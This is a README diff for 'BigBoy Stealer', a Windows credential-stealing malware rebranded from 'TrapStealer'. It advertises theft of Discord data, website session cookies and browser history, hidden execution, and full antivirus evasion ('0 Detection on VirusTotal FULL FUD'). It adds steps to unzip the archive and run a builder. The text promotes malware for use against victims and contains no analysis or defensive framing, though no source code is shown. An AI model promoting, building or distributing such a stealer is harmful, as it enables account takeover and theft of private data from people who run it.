@@ -1,15 +1,15 @@
 # BigBoyStealer
-BigBoy Stealer
-TrapStealer is a Windows stealer for Discord and much more. Steal Time: ~4-7 seconds. 0 Detection on VirusTotal (Injection too)
+
+BigBoy Stealer is a Windows stealer for Discord and much more. Steal Time: ~2 seconds. 0 Detection on VirusTotal FULL FUD
 
 Discord Support URL (Any features requests)
 
-🌐 〢 Summary
-✨・Features
-📝・Changelog
-💼・Terms
-Cybersecurity Society start talking about us
-✨・Features
+💎・Features
+⚠️・HOW TO INSTALL IT
+
+
+💎・Features
+
 🖼️ - Custom icon (Put custom icon (.ico format))
 
 🤖 - Website Cookie Information (Spotify, Roblox, Tiktok, Guilded, Patreon)
@@ -55,12 +55,8 @@ Cybersecurity Society start talking about us
 🪐 - Browser History Stealer: Steals history search of multiple browsers (Chrome, Opera/GX, Firefox, Edge, Safari, Internet Explorer, Brave)
 
 🪟 - Hide windows: Make the command prompt disappear.
-📝・Changelog
-- V4.6.2 Fixed Crypto error
-- V4.6 Better Looking Obfuscation and added Custom Icon
-- V4.5.5 More Cookie Information website (+3) and fixed on obfuscator error
-- V4.5 Added tiktok session stealer
-- V4.4.8 Better obfuscator
-- V4.4.7 Fixed some stuff
-- V4.4.6 Make it 2x faster
-- V4.4.5 Account about me changer added
+
+⚠️ HOW TO INSTALL IT
+
+1. Unzip the rar file
+2. Run "builder"
